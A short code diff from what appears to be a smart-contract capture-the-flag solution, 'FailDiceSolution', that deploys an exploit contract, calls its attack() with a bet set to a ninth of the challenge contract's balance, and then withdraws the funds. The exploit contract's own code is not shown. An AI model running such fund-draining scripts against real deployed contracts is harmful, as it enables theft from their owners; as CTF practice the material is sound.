@@ -39,13 +39,14 @@ class FailDiceSolution extends Solution {
 
             console.log("Deployed exploit");
             const cBalance = await this.w3.eth.getBalance(this.challengeAddr);
-            const gas = await deployedExploit.methods.attack().estimateGas({ from: this.myAddr, value: cBalance });
+            const bet = Math.ceil(cBalance / 9);
+            const gas = await deployedExploit.methods.attack().estimateGas({ from: this.myAddr, value: bet });
 
             console.log("Starting attack");
             await deployedExploit.methods.attack().send({
                 from: this.myAddr,
                 gas,
-                value: cBalance,
+                value: bet,
             });
 
             console.log("Attacked, withdrawing funds");
